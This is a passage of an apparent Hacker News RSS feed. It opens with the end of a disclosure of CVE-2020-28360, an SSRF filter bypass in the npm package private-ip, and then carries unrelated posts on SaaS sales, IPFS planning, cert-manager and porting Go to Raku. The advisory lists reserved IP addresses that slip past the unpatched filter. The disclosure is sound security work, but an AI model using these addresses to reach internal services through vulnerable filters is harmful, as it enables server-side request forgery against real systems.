<p>Several other files were modified, but this key-function helped enable the private-ip package to account for the private-ip address ranges and variations, on the byte level. Hackers attempting to bypass SSRF vulnerabilities will now have an exceedingly difficult time because even payloads encoded into hexadecimal, etc, will be recognized as the IP address as if it were not encoded, triggering a conditional block.</p>
<h3 id="further-analysis-and-proofs-of-concept">Further Analysis and Proofs of Concept</h3>
<h4 id="the-following-proofs-of-concept-are-by-sickcodeshttpstwittercomsickcodes-and-nick-sahlerhttpstwittercomtensor_bodega">The following Proofs of Concept are by <a href="https://twitter.com/sickcodes">SickCodes</a> and <a href="https://twitter.com/tensor_bodega">Nick Sahler</a></h4>
<p>Follow Sick.Codes on Twitter: <a href="https://twitter.com/sickcodes">@SickCodes</a></p>
<p>Follow Nick Sahler on Twitter: <a href="https://twitter.com/tensor_bodega">@tensor_bodega</a></p>
<h2 id="global-impact-of-cve-2020-28360">Global Impact of CVE-2020-28360</h2>
<p>As the time of discovery, there were:</p>
<ul>
<li>12,120 direct weekly downloads of private-ip</li>
<li>355 publicly identified npm dependents of private-ip v1.0.5; packages that rely on private-ip.
-- <a href="https://github.com/sickcodes/security/raw/master/etc/CVE-2020-28360-private-ip-dependents.txt">https://github.com/sickcodes/security/raw/master/etc/CVE-2020-28360-private-ip-dependents.txt</a></li>
<li>73 GitHub projects that depend on private-ip <a href="https://github.com/frenchbread/private-ip/network/dependents">https://github.com/frenchbread/private-ip/network/dependents</a></li>
<li>153,374 combined weekly downloads of all dependents, with the largest being libp2p related.
-- <a href="https://github.com/sickcodes/security/raw/master/etc/CVE-2020-28360-weekly-downloads.csv">https://github.com/sickcodes/security/raw/master/etc/CVE-2020-28360-weekly-downloads.csv</a></li>
</ul>
<h2 id="poc---using-patched-private-ip-200-on-tests-from-105">PoC - Using patched private-ip 2.0.0 on tests from 1.0.5</h2>
<p>Sick Codes used the ARIN IPv4 Address Space Registry: <a href="https://www.iana.org/assignments/ipv4-address-space/ipv4-address-space.xhtml">https://www.iana.org/assignments/ipv4-address-space/ipv4-address-space.xhtml</a></p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code></pre></td>
<td>
<pre><code data-lang="bash">git clone https://github.com/frenchbread/private-ip.git
<span>cd</span> private-ip
<span># git checkout master</span>
git checkout 1.0.5 -- ./test.js
npm run <span>test</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>Running patched private-ip 2.0.0 code against private-ip 1.0.5 test IPs:</p>
<ul>
<li>17 passed</li>
<li>2 failed</li>
</ul>
<p>The test ARIN reserved (private) IPs that failed are:</p>
<ul>
<li>255.38.207.121</li>
<li>250.29.143.180</li>
</ul>
<p>This indicates that since August 3rd 2016, 2 of the original test IP addresses have actually been reserved addresses.</p>
<h2 id="poc---using-unpatched-private-ip-105-on-new-tests-from-200">PoC - Using unpatched private-ip 1.0.5 on new tests from 2.0.0</h2>
<p>The new test includes the minimum and maximum of every ipv4 range that is ARIN reserved.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code></pre></td>
<td>
<pre><code data-lang="bash">git clone https://github.com/frenchbread/private-ip.git
<span>cd</span> private-ip
git checkout -f master
git checkout 1.0.5 -- ./src/index.js
npm run <span>test</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>Using the 1.0.5 RegEx with 2.0.0 <a href="https://github.com/sickcodes/private-ip/blob/master/test.js">test.js</a></p>
<p>Running private-ip 1.0.5 code against the minimum and maximum of private IP ranges in 2.0.0 test.js:</p>
<ul>
<li>37 passed</li>
<li>71 failed</li>
</ul>
<p>This indicates that since August 3rd 2016, a large number of reserved IP ranges have been considered public IP addresses.</p>
<p>An application that relies on private-ip 1.0.5 and below to verify whether an incoming request is to localhost, or a private resource, may perform a request to an local IP address, or an IP address that is reserved, potentially resulting in an SSRF.</p>
<p>Since since August 3rd 2016 the following IP’s, and all of the IP addresses between them, have returned results for private-ip.</p>
<p>The following tests in the updated test.js indicate that these were incorrectly designated as public IPs:</p>
<pre><code>0.0.0.0
0.0.0.1
0.0.0.255
0.0.0.7
0.0.255.255
0.1.255.255
0.15.255.255
0.255.255.254
0.255.255.255
0.63.255.255
100.127.255.254
100.127.255.255
100.64.0.0
100.64.0.1
192.0.0.0
192.0.0.1
192.0.0.10
192.0.0.11
192.0.0.170
192.0.0.171
192.0.0.254
192.0.0.255
192.0.0.6
192.0.0.7
192.0.0.8
192.0.0.9
192.0.2.0
192.0.2.1
192.0.2.254
192.0.2.255
192.175.48.0
192.175.48.1
192.175.48.254
192.175.48.255
192.31.196.0
192.31.196.1
192.31.196.254
192.31.196.255
192.52.193.0
192.52.193.1
192.52.193.254
192.52.193.255
192.88.99.0
192.88.99.1
192.88.99.254
192.88.99.255
198.18.0.0
198.18.0.1
198.19.255.254
198.19.255.255
198.51.100.0
198.51.100.1
198.51.100.254
198.51.100.255
203.0.113.0
203.0.113.1
203.0.113.254
203.0.113.255
240.0.0.0
240.0.0.1
255.0.0.0
255.192.0.0
255.240.0.0
255.254.0.0
255.255.0.0
255.255.255.0
255.255.255.248
255.255.255.254
255.255.255.255
0000.0000.0000.0000
</code></pre>
<p>All of the above IPs can result in SSRF in private-ip v1.0.5.</p>
<p>As this is a server-side package, it is difficult to ascertain the exact magnitude of use, as there are an incalculable number of server-side projects that use private-ip internally.</p>
<p>You can find Nick &amp; I (Sick.Codes)’s pull request to fix the private-ip package here: <a href="https://github.com/frenchbread/private-ip/pull/2">https://github.com/frenchbread/private-ip/pull/2</a></p>

<p><a href="https://www.npmjs.com/package/private-ip" title="https://www.npmjs.com/package/private-ip">https://www.npmjs.com/package/private-ip</a><br>
<a href="https://johnjhacking.com/blog/cve-2020-28360" title="https://johnjhacking.com/blog/cve-2020-28360">https://johnjhacking.com/blog/cve-2020-28360</a><br>
<a href="https://github.com/sickcodes/security/blob/master/advisories/SICK-2020-022.md" title="https://github.com/sickcodes/security/blob/master/advisories/SICK-2020-022.md">https://github.com/sickcodes/security/blob/master/advisories/SICK-2020-022.md</a><br>
<a href="https://sick.codes/sick-2020-022" title="https://sick.codes/sick-2020-022">https://sick.codes/sick-2020-022</a><br>
<a href="https://twitter.com/johnjhacking" title="https://twitter.com/johnjhacking">https://twitter.com/johnjhacking</a><br>
<a href="https://www.linkedin.com/in/huntharo" title="https://www.linkedin.com/in/huntharo">https://www.linkedin.com/in/huntharo</a><br>
<a href="https://twitter.com/sickcodes" title="https://twitter.com/sickcodes">https://twitter.com/sickcodes</a><br>
<a href="https://twitter.com/tensor_bodega" title="https://twitter.com/tensor_bodega">https://twitter.com/tensor_bodega</a></p>

<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28360" title="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28360">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28360</a><br>
<a href="https://nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-28360" title="https://nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-28360">https://nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-28360</a></p>

    </div></div>]]>
            </description>
            <link>https://johnjhacking.com/blog/cve-2020-28360/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25189499</guid>
            <pubDate>Mon, 23 Nov 2020 17:55:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Buyers vs. Users]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25189437">thread link</a>) | @neinasaservice
<br/>
November 23, 2020 | https://21-lessons.com/buyers-vs-users/ | <a href="https://web.archive.org/web/*/https://21-lessons.com/buyers-vs-users/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<!-- .entry-header -->

		<div>
			
<p id="h-let-s-say-you-sell-a-saas-product-with-software-developers-as-the-target-audience-they-get-in-touch-to-talk-about-testing-the-product-in-their-organization-even-if-they-are-the-ones-talking-to-sales-initially-and-drive-a-proof-of-concept-are-they-also-the-ones-buying-it">Let’s say you sell a SaaS product, with software developers as the target audience.<br>They get in touch to talk about testing the product in their organization.<br>Even if they are the ones talking to Sales initially and drive a Proof of Concept, are they also the ones buying it?</p>



<p>Not necessarily. In some organizations, software developers can make buying decisions, either directly by using the company credit card or through their manager, who purchases based on a majority vote.</p>



<p>But in other organizations, the person buying the product is not the same as using it later on.<br>The buyer might be someone from the purchasing department or a C-Level executive.<br>In either case, have you tried talking to them in the same way you talk to developers about your product?<br>I did initially, and it wasn’t fruitful. A CTO doesn’t care too much about all the great features we provide.</p>



<p>First of all, a CTO wouldn’t directly use the product, but also, they have different metrics to determine success for themselves.<br>Metrics to determine success?<br>For instance, a developer might determine their success by the number of features delivered, the number of bugs fixed, or how many code reviews they performed.<br>On the other hand, a CTO might be concerned with the efficiency of the entire developer organization or how to save costs.<br>With these metrics in mind, can your product make an impact?<br>What are the benefits that enable cost savings and an increase in efficiency?</p>



<p>Now, how is that critical for sales conversations?<br>When you talk to developers in, let’s say, an initial discovery call, you discuss their use cases and see if you might be able to help them. It’s a technical conversation.<br>Then, you need to find out about the next steps and which ultimately makes the purchasing decision.<br>In case somebody else makes the purchasing decision, find out as much as you can about the process. Will there be a meeting? Who else is attending?<br>Can you talk to the decision-maker directly? For these discussions, you need to have your arguments and benefits at hand that matter <em>to them</em>. How can you save costs? How can you enable the team to be more efficient? What is your story?</p>



<p>Even if you can’t talk to the decision-maker directly, offer to meet with the developers to prep them for the decision-making meeting with your prepared arguments.<br>It’s common in today’s organizations that you have influencers and advocates in the organization who sell on your behalf. They like the company, the product and now put in the effort to get it purchased.<br>The better you can support them in these discussions, the higher the chance to close a deal.</p>



<p>Now, what are your benefits? Sit down and come up with the benefits necessary for the users. Then, do the same again for the buyer. What do they care about, and how can you make their lives easier?</p>

					</div><!-- .entry-content -->

		
			</div></div>]]>
            </description>
            <link>https://21-lessons.com/buyers-vs-users/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25189437</guid>
            <pubDate>Mon, 23 Nov 2020 17:50:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[IPFS in 2021 – Call for Proposals]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25189246">thread link</a>) | @atopal
<br/>
November 23, 2020 | https://blog.ipfs.io/2020-11-19-community-rfp/ | <a href="https://web.archive.org/web/*/https://blog.ipfs.io/2020-11-19-community-rfp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    


    <div>
      
      <p>by David Choi &amp; Kadir Topal on 2020-11-19</p>

      

      

<p><img src="https://blog.ipfs.io/header_images/113-community-rfp.jpg" alt="IPFS Project Planning"></p>



<p>As 2020 comes to a close and we look ahead to 2021, it’s time to evaluate what’s important for the IPFS Project to focus on next year – and we need your help! Get involved now and shape the IPFS project plan for the next year. Help us reflect on IPFS progress and status, how the wider ecosystem and internet has evolved over the past year, and chart a course for our work in 2021 that optimizes for the long term success of our mission.</p>

<p>This post can also be found in the <a href="https://github.com/ipfs/roadmap/blob/master/2021-IPFS-Project-Planning.md">IPFS Roadmap Github repo</a>.</p>

<h2 id="potential-themes-for-2021">Potential Themes for 2021</h2>

<p>The IPFS team has started evaluating potential themes to guide the project in 2021. These themes are high level outcomes that would take a quarter or more and multiple initiatives to complete. See <a href="https://github.com/ipfs/roadmap/issues?q=is%3Aissue+is%3Aopen+label%3A%222021+Theme+Proposal%22">the Roadmap repo</a> for a first pass at themes that resonate with the core IPFS Working Groups. The final north star for 2021 might be a combination of them or something that emerges from your input. As usual, this is a collaborative effort to assess what is important for the IPFS Project to achieve next year - work that we hope spans the efforts of many teams and projects - so we hope this process is a great feedback mechanism for many groups throughout the IPFS Ecosystem!</p>

<h2 id="proposal-process">Proposal Process</h2>

<p>We want to hear from you in the form of public Github issues. Issues should contain a potential theme that you think IPFS should tackle in 2021 - and why. Your theme proposals can be at any level of granularity — from general direction for the project, to specific features or tooling improvements, to ecosystem needs — everything is in scope. We want to hear what’s on your mind, what direction you want to take IPFS, and what your pain points are.</p>

<p>Aside from new theme proposals, we’d also very much appreciate comments on theme proposals, especially if there are additional important workstreams you’d like to see as part of that theme. Existing proposals for themes can be found <a href="https://github.com/ipfs/roadmap/issues?q=is%3Aissue+is%3Aopen+label%3A%222021+Theme+Proposal%22">here</a>.</p>

<p><a href="https://github.com/ipfs/roadmap/issues?q=is%3Aissue+is%3Aopen+label%3A%222021+Theme+Proposal%22"><img src="https://blog.ipfs.io/113-community-rfp/screenshot.png" alt="Proposals Screenshot"></a></p>

<p>To suggest a theme proposal, please create a <a href="https://github.com/ipfs/roadmap/issues/new/choose">new 2021 Proposal issue</a> in this repo. The hope with using github issues is to allow for clarifying conversation in comments, help others build on your great ideas, and also be inspired to propose their own thoughts. You are welcome to submit more than one proposal!</p>

<h3 id="the-2021-theme-proposal-template-https-github-com-ipfs-roadmap-issues-new-choose-includes">The <a href="https://github.com/ipfs/roadmap/issues/new/choose">2021 Theme Proposal template</a> includes</h3>

<ul>
<li><strong>Theme title</strong></li>
<li><strong>Description</strong>: What is the objective of the theme, what problem does it solve, and what would executing on it entail?</li>
<li><strong>Hypothesis</strong>: What do you need to believe for this to make sense as a 2021 theme?</li>
<li><strong>Vision statement</strong>: If executing on the theme or initiative is massively successful, what would the state of the IPFS project look like?</li>
<li><strong>Why focus this year</strong>: Why does it make sense to focus on this theme or initiative this year?</li>
<li><strong>Example workstreams</strong>: What are potential workstreams, milestones, etc. that this initiative or theme might involve?
Feel free to include any other relevant content!</li>
</ul>

<p>Check out <a href="https://github.com/ipfs/roadmap/issues?q=is%3Aissue+is%3Aopen+label%3A%222021+Theme+Proposal%22">existing proposals for themes here</a> if helpful.</p>

<h3 id="2021-planning-process-timeline">2021 Planning Process Timeline 📆</h3>

<ul>
<li><strong>Nov 19 - Dec 7</strong>: Open call for 2021 Proposals (add yours <a href="https://github.com/ipfs/roadmap/issues/new/choose">here</a>)</li>
<li><strong>Dec 16 - Dec 20</strong>: IPFS 2021 planning “Spike”</li>
<li><strong>Dec 20 - Jan 11</strong>: Review and feedback on 2021 theme(s) with key stakeholders</li>
<li><strong>Jan 18</strong>: Finalize and present 2021 theme(s) and updated roadmap</li>
</ul>


      
          
          
          
      
    </div>
  </div></div>]]>
            </description>
            <link>https://blog.ipfs.io/2020-11-19-community-rfp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25189246</guid>
            <pubDate>Mon, 23 Nov 2020 17:33:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cert-Manager Now Part of the CNCF Sandbox Family as Jetstack Completes Donation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25189211">thread link</a>) | @AnnieNma
<br/>
November 23, 2020 | https://thechief.io/c/news/cert-manager-now-part-cncf-sandbox-family-jetstack-completes-donation/ | <a href="https://web.archive.org/web/*/https://thechief.io/c/news/cert-manager-now-part-cncf-sandbox-family-jetstack-completes-donation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><p>Jetstack is mainly a Kubernetes professional services company founded in 2015 and recently acquired by Venafi, a security company specialized in different areas mainly machine identity. According to the <a href="https://www.venafi.com/blog/why-venafi-acquisition-good-jetstack-community">Venafi</a>:</p><blockquote>The combination of speed and security creates an interesting dilemma. How do you build software quick enough to compete, without the risk of being exploited? This is the challenge that Jetstack and Venafi will solve.</blockquote><p>Back to cert-manager, Jetstack recently announced the release of the v1 API for this tool, which made the technology more mature and powerful. This release allows developers to have greater visibility and control over their certificates.</p><p>Currently, the Venafi+Jetsack team has been working towards integrating Google's new Certificate Authority Service (CAS) with cert-manager. This will offer developers private CA keys as a service, using HSMs, which are validated at FIPS 140-2 Level 3.</p></div></section><section><section><div><blockquote>
                Itâ€™s exciting to see cert-manager join the CNCF Sandbox. Itâ€™s been several years in the making to get to 1.0, and weâ€™re hugely thankful to a community of over 250 contributors, and many end-users, to get it to where it is today. This is a foundational add-on to many Kubernetes and OpenShift clusters, and the project will benefit from being part of the CNCF and its ecosystem. We look forward to attracting a diverse contributor base and extending our partnership and cooperation with many other projects to further enhance the developer and operator experience.
                <br></blockquote></div></section></section></div>]]>
            </description>
            <link>https://thechief.io/c/news/cert-manager-now-part-cncf-sandbox-family-jetstack-completes-donation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25189211</guid>
            <pubDate>Mon, 23 Nov 2020 17:31:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Porting from Go to Raku – JJ Atria]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25188808">thread link</a>) | @lizmat
<br/>
November 23, 2020 | https://pinguinorodriguez.cl/blog/porting-from-go/ | <a href="https://web.archive.org/web/*/https://pinguinorodriguez.cl/blog/porting-from-go/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p>In the past year or so, every time I’ve wanted to use hot-reloading<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> for
some service I’m writing, I’ve reached for a tool called <a href="https://github.com/cespare/reflex"><code>reflex</code></a>. This
tool is not particularly original, but it is a reasonably good implementation,
and it ships as a standalone-binary, which makes it very easy to move about.</p>

<p>It is also written in a language I have some familiarity with, and one that
I’m trying to learn more about.</p>

<p>So of course I decided to implement my own.</p>

<p>The motivation was basically the same as <a href="https://pinguinorodriguez.cl/blog/introducing-http-tiny">the one that lead to
HTTP::Tiny</a>: a desire to understand how the code worked, and a
search for real-world problems to attempt to solve using Raku. I might write
more in a later post about the specifics of <a href="https://modules.raku.org/dist/App::Lorea:cpan:JJATRIA"><code>lorea</code></a>, but in this post I
want to focus on one aspect in particular, which I think showcases some of
the strengths of Raku… and some of its weaknesses.</p>

<h2 id="some-go-code-to-get-going">Some Go code to get going</h2>

<p>One of the nice features of <code>reflex</code> is that it batches file-system changes
to limit how often the command it needs to re-run gets executed. This is how
that feature is explained in <a href="https://github.com/cespare/reflex#batching">the documentation</a>:</p>

<blockquote>
  <p>Part of what reflex does is apply some heuristics to batch together
file changes. There are many reasons that files change on disk, and
these changes frequently come in large bursts. For instance, when you
save a file in your editor, it probably makes a tempfile and then
copies it over the target, leading to several different changes.
Reflex hides this from you by batching some changes together.</p>
</blockquote>

<p>Simple enough.</p>

<p>Now let’s look at <a href="https://github.com/cespare/reflex/blob/456b3718abbf1922cfbd498521c27851250f5496/reflex.go#L149-L186">the implementation</a>:</p>

<div><div><pre><code><span>func</span> <span>(</span><span>r</span> <span>*</span><span>Reflex</span><span>)</span> <span>batch</span><span>(</span><span>out</span> <span>chan</span><span>&lt;-</span> <span>string</span><span>,</span> <span>in</span> <span>&lt;-</span><span>chan</span> <span>string</span><span>)</span> <span>{</span>
    <span>const</span> <span>silenceInterval</span> <span>=</span> <span>300</span> <span>*</span> <span>time</span><span>.</span><span>Millisecond</span>
    <span>for</span> <span>name</span> <span>:=</span> <span>range</span> <span>in</span> <span>{</span>
        <span>r</span><span>.</span><span>backlog</span><span>.</span><span>Add</span><span>(</span><span>name</span><span>)</span>
        <span>timer</span> <span>:=</span> <span>time</span><span>.</span><span>NewTimer</span><span>(</span><span>silenceInterval</span><span>)</span>
    <span>outer</span><span>:</span>
        <span>for</span> <span>{</span>
            <span>select</span> <span>{</span>
            <span>case</span> <span>name</span> <span>:=</span> <span>&lt;-</span><span>in</span><span>:</span>
                <span>r</span><span>.</span><span>backlog</span><span>.</span><span>Add</span><span>(</span><span>name</span><span>)</span>
                <span>if</span> <span>!</span><span>timer</span><span>.</span><span>Stop</span><span>()</span> <span>{</span>
                        <span>&lt;-</span><span>timer</span><span>.</span><span>C</span>
                <span>}</span>
                <span>timer</span><span>.</span><span>Reset</span><span>(</span><span>silenceInterval</span><span>)</span>
            <span>case</span> <span>&lt;-</span><span>timer</span><span>.</span><span>C</span><span>:</span>
                <span>for</span> <span>{</span>
                    <span>select</span> <span>{</span>
                    <span>case</span> <span>name</span> <span>:=</span> <span>&lt;-</span><span>in</span><span>:</span>
                        <span>r</span><span>.</span><span>backlog</span><span>.</span><span>Add</span><span>(</span><span>name</span><span>)</span>
                    <span>case</span> <span>out</span> <span>&lt;-</span> <span>r</span><span>.</span><span>backlog</span><span>.</span><span>Next</span><span>()</span><span>:</span>
                        <span>if</span> <span>r</span><span>.</span><span>backlog</span><span>.</span><span>RemoveOne</span><span>()</span> <span>{</span>
                            <span>break</span> <span>outer</span>
                        <span>}</span>
                    <span>}</span>
                <span>}</span>
            <span>}</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Yikes.</p>

<p>That block comes with a comment on top with these notes:</p>

<blockquote>
  <p><code>batch</code> receives file notification events and batches them up. It’s a bit
tricky, but here’s what it accomplishes:</p>
  <ul>
    <li>When we initially get a message, wait a bit and batch messages before
trying to send anything. This is because the file events come in bursts.</li>
    <li>Once it’s time to send, don’t do it until the out channel is unblocked.
In the meantime, keep batching. When we’ve sent off all the batched
messages, go back to the beginning.</li>
  </ul>
</blockquote>

<p>When I came across this piece of code, I had to re-read it several times, and
cross-reference that to the comment, and read through a couple of pages of
documentation before I could say I understood it. And now, to write this post,
I had to spend a good couple of minutes more staring at it before I could
remember how it worked.</p>

<p>In short, this is waiting on file-system changes to come in from a <code>channel</code>,
and it adds them to a backlog as they come in. It continues to do this until
there is a break between the incoming changes of at least 300 milliseconds,
and it then processes them.</p>

<p>The key here is the interaction between the <code>time.Timer</code> to keep track of
that time window, and the incoming and outgoing channels, which in Go are
blocking. The nested loops are there to make it so that, if an event comes
in while some other part of the system is running, it will also get
processed.</p>

<h2 id="porting-it-to-raku">Porting it to Raku</h2>

<p>As it turns out, porting code from Go to Raku is normally quite painless.
Like Go, Raku has superb support for asynchronous programming, and helper
classes like channels are built-in.</p>

<p>However, when it came to porting this bit of code I ran into a bit of a
complication: Raku has no equivalent to <code>time.Timer</code>.</p>

<p>For this particular case, the Go timer was being used to schedule an
events that would trigger in the future, unless it was re-scheduled to
happen further in the future via the <code>timer.Reset</code> call.</p>

<p>Now, while Raku comes with classes to represent <a href="https://docs.raku.org/type/Instant">moments in time</a>, as
well as <a href="https://docs.raku.org/type/Promise">events in the future</a>, these are not particularly well suited
for this case. For one, even if you can schedule an event in the future
(eg. with <code>Promise.new: $delay</code>) this promise <em>will take place</em>. Even if
you are not paying attention to it, any code you schedule will run.</p>

<p>While it does look like there is some intention of implementing cancellations
for Promises in the future, we’re not there yet. So we’ve got to make do with
what we have.</p>

<p>Luckily, Raku is a language that is built on the notion that you should have
enough rope to shoot yourself in the foot, and that it does. Enter
<a href="https://modules.raku.org/dist/Timer::Breakable:cpan:SCIMON">Timer::Breakable</a>, which implements something alike to breakable promises,
and my very own <a href="https://modules.raku.org/dist/Timer::Stopwatch:cpan:JJATRIA">Timer::Stopwatch</a>, which uses them to implement basically
the same idea as the Go timer.</p>

<h2 id="the-resulting-code">The resulting code</h2>

<p>With that set aside, let’s look at how that Go code compares to <a href="https://gitlab.com/jjatria/lorea/-/blob/a01e6ea0293fae79108bc912ac09e37757a12931/lib/App/Lorea/Command.rakumod#L95-109">the equivalent
code in Raku</a>:</p>

<div><div><pre><code>method run ( --&gt; Promise ) {
    use Timer::Stopwatch;
    my Timer::Stopwatch $timer .= new;

    start react {
        whenever $!supply {
            $timer.reset: 0.3;
            $!queue.add: .path;
        }
        whenever $timer { start self!process-queue }
    }
}
</code></pre></div></div>

<p>The beauty here is that, unlike in Go, I’m using a <a href="https://docs.raku.org/type/Supply">Supply</a> which offers the
same asynchronous guarantees as a channel with the benefit that reading and
writing from it does not block, so the nested loops to make sure that we catch
events that happen while we are waiting are gone.</p>

<h2 id="trade-offs-trade-offs">Trade-offs, trade-offs</h2>

<p>It’s possible that there are some subtle differences between the two versions
of this code, but they are functionally identical, and I was happy to get rid
of the added complexity to get code that I can understand at a glance.</p>

<p>It did highlight in my eyes one of the limitations in Raku, however: that the
standard library, while huge in some respects, still lacks tools to do some of
the things that you might argue are pretty basic.</p>

<p>Luckily, this kind of thing can be remedied by libraries and modules that
extend the language, like the ones shown here. And as more of these real-world
cases are explored, one can hope that cases like these, where we lack the
tools to get the job done, become a rarity.</p>

<p>I’ll be happy to continue to contribute to that end.</p>


</div></div>]]>
            </description>
            <link>https://pinguinorodriguez.cl/blog/porting-from-go/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25188808</guid>
            <pubDate>Mon, 23 Nov 2020 16:59:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Selling to unicorns from my parents basement]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 20 (<a href="https://news.ycombinator.com/item?id=25188716">thread link</a>) | @timjones
<br/>
November 23, 2020 | https://www.themvpsprint.com/p/selling-to-unicorns-from-my-parents | <a href="https://web.archive.org/web/*/https://www.themvpsprint.com/p/selling-to-unicorns-from-my-parents">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>⚔️ David selling to Goliath</h2><p><strong>Me</strong> - a <a href="https://www.themvpsprint.com/about">bootstrapped solopreneur</a> with a laptop and a dream.</p><p><strong>Them</strong> - a billion dollar unicorn with 10,000+ employees.</p><h4><strong>Will I really be able to sell into their corporate web of bureaucracy?</strong></h4><h2>💸 From idea to revenue</h2><p><em><a href="https://www.themvpsprint.com/about">I’m a solo, bootstrapped founder</a></em> building a SaaS startup in public.</p><p>Over the last 4 weeks, I’ve <a href="https://mvpsprint.substack.com/p/choose-a-problem">chosen a problem to solve</a>, <a href="https://mvpsprint.substack.com/p/step-2-even-unicorns-walk-before-they-run">picked a niche</a>, <a href="https://www.themvpsprint.com/p/step-3-seeking-validation">validated my problem</a>, and <a href="https://www.themvpsprint.com/p/how-and-when-to-acquire-saas-users">created a top-of-the-funnel distribution strategy</a>.</p><p>This week I create a strategy for selling <a href="https://www.hellohailey.io/">HelloHailey</a> into companies of all sizes - from small startups to billion dollar unicorns.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff35cb8c0-fa57-49c8-8fbf-07073ac66533_971x2774.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff35cb8c0-fa57-49c8-8fbf-07073ac66533_971x2774.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/f35cb8c0-fa57-49c8-8fbf-07073ac66533_971x2774.png&quot;,&quot;height&quot;:2774,&quot;width&quot;:971,&quot;resizeWidth&quot;:368,&quot;bytes&quot;:277261,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>I’m sharing all my product decisions, metrics, successes, and failures in public.</p><p><strong>Next Monday, I’ll (finally) describe the product I’m building.</strong> Want to read it in your inbox?</p><p data-attrs="{&quot;url&quot;:&quot;https://www.themvpsprint.com/subscribe&quot;,&quot;text&quot;:&quot;Get my real-time case study&quot;,&quot;class&quot;:null}"><a href="https://www.themvpsprint.com/subscribe"><span>Get my real-time case study</span></a></p><h2>🚀 Land and expand</h2><p>The traditional SaaS sales process follows a <strong>top-down approach</strong>. A sales rep targets a high-level decision maker for a high-priced deal.</p><p>After a long sales process, a company slowly integrates a piece of software. <strong>The command comes from high in the org chart and makes its way down.</strong></p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F2651c983-567a-4996-b90d-6c2eef084537_2692x2200.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F2651c983-567a-4996-b90d-6c2eef084537_2692x2200.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/2651c983-567a-4996-b90d-6c2eef084537_2692x2200.png&quot;,&quot;height&quot;:1190,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:303429,&quot;alt&quot;:&quot;Top-down sales strategy&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt="Top-down sales strategy"></a><figcaption>A top-down sales approach targets the top of the org chart.</figcaption></figure></div><h3><strong>But I’ll be selling bottom-up</strong> </h3><p><strong>I’ll scale the corporate walls via product managers (PMs) and engineering managers (EMs)</strong>. </p><p>I’ll look unintimidating - a low price product that eats up a small chunk of a budget these team leads control.</p><p><strong>Then I’ll spread through the company like wildfire </strong>via growth mechanisms built into the product.</p><p>One team will adopt me.</p><p>Then two.</p><p>Then the entire department. </p><p>Then the entire company.</p><div><figure><a target="_blank" 